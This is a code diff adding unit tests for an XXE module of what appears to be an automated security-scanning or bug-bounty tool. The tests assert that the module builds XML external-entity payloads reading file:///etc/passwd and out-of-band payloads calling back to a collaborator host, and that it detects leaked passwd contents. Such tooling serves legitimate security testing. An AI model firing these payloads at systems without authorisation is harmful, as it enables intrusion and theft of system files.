@@ -37,6 +37,7 @@ import deser_tool as deser
 import oauth_tool as oauth
 import exposure_tool as exp
 import collaborator as collab
+import xxe_tool as xxe
 
 
 # ── security: target validation ──────────────────────────────────
@@ -886,6 +887,39 @@ def test_collab_enabled_follows_env():
         assert collab.enabled() is True and collab.base() == "http://agent:8000"
     finally:
         os.environ.pop("BBH_OOB_BASE", None)
+
+
+# ── xxe_tool: external-entity payloads + reflection analysis ─────
+def test_xxe_inband_payload_declares_entity_and_reference():
+    xml = xxe.build_inband_xml("file:///etc/passwd", '<?xml version="1.0"?>\n<user><name>bob</name></user>')
+    assert '<!ENTITY xxe SYSTEM "file:///etc/passwd">' in xml
+    assert "&xxe;" in xml and "<!DOCTYPE" in xml
+
+
+def test_xxe_oob_payload_uses_parameter_entity():
+    xml = xxe.build_oob_xml("http://agent:8000/oob/abc123")
+    assert "http://agent:8000/oob/abc123" in xml and "% rem" in xml and "%rem;" in xml
+
+
+def test_xxe_analyze_inband_detects_passwd_not_random():
+    body = "<user><name>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1</name></user>"
+    hit = xxe.analyze_inband(body)
+    assert hit and hit["file"] == "file:///etc/passwd"
+    assert xxe.analyze_inband("<user><name>hello</name></user>") is None
+
+
+def test_xxe_looks_like_xml():
+    assert xxe.looks_like_xml("application/xml", "") is True
+    assert xxe.looks_like_xml("application/soap+xml", "") is True
+    assert xxe.looks_like_xml("", "<?xml version='1.0'?><a/>") is True
+    assert xxe.looks_like_xml("application/json", '{"a":1}') is False
+
+
+def test_xxe_finding_shapes():
+    ib = xxe.inband_finding("https://t/api", "file:///etc/passwd", "root:x:0:0:")
+    assert ib["severity"] == "critical" and ib["cwe"] == "CWE-611" and ib["confidence"] == "confirmed"
+    ob = xxe.oob_finding("https://t/api", "http://a/oob/t", [{"source_ip": "198.51.100.7"}])
+    assert ob["confidence"] == "confirmed" and "198.51.100.7" in ob["evidence"]
 
 
 def _run(coro):
